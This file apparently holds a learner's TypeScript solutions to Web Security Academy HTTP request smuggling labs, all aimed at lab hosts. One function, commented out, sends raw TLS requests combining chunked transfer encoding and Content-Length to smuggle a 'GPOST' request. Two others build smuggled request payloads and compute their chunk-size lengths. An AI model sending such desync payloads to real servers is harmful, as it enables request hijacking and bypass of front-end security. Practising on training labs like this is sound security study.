// import https from 'https'
import net from "net";
import tls from "tls";

// async function lab1() {
//   await sendRequest(1);
//   await sendRequest(2);
// }
// function sendRequest(round: 1 | 2) {
//   return new Promise<true>((resolve) => {
//     const url = new URL(
//       "https://0ae200cc04c1b1a8814fed49003b0098.web-security-academy.net/",
//     );
//     const smuggledBody = `0\r\n\r\nGPOST / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0`;
//     const socket = net.connect(443, url.host);
//     socket.on("connect", () => {
//       const tlsSocket = tls.connect({ socket, servername: url.host });
//       tlsSocket.on("secureConnect", () => {
//         const firstBody =
//           "POST / HTTP/1.1\r\n" +
//           `host: ${url.host}\r\n` +
//           "transfer-encoding: chunked\r\n" +
//           "content-type: text/plain\r\n" +
//           `content-length: ${Buffer.byteLength(smuggledBody)}\r\n` +
//           "\r\n" +
//           smuggledBody;
//         const secondBody = `\r\n\r\nGET / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0\r\n\r\n`;
//         tlsSocket.write(round === 1 ? firstBody : secondBody);
//       });
//       const chunks: Buffer[] = [];
//       tlsSocket.on("data", (chunk) => {
//         chunks.push(chunk);
//       });
//       tlsSocket.on("end", () => {
//         const body = Buffer.concat(chunks).toString("utf-8");
//         console.log(body);
//         resolve(true);
//       });
//     });
//   });
// }

// lab1();

// function lab2() {
//   const request1 = `GPOST / HTTP/1.1\r\nHost: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net\r\n\r\n`;
//   const hex1 = Buffer.byteLength(request1).toString(16);

//   const request2 = `GPOST / HTTP/1.1\r\nHost: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net\r\nContent-Type: text/plain\r\nContent-Length: 15\r\n\r\nOnly11Bytes`;
//   const hex2 = Buffer.byteLength(request2).toString(16);

//   const string3 = `Only11Bytes\r\n0\r\n\r\n`;
//   const hex3 = Buffer.byteLength(string3).toString(10);

//   console.log({
//     [request1]: hex1,
//     [request2]: hex2,
//     [string3]: hex3,
//   });
// }

// lab2();

function lab3() {
  const request1 = `GPOST / HTTP/1.1\r\nHost: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net\r\nContent-Length: ??\r\n\r\nOnly??Bytes`;
  const hex1 = Buffer.byteLength(request1).toString(16);

  const string2 = `Only11Bytes\r\n0\r\n\r\n`;
  const hex2 = Buffer.byteLength(string2).toString(10);

  console.log({
    [request1]: hex1,
    [string2]: hex2,
  });
}

lab3();
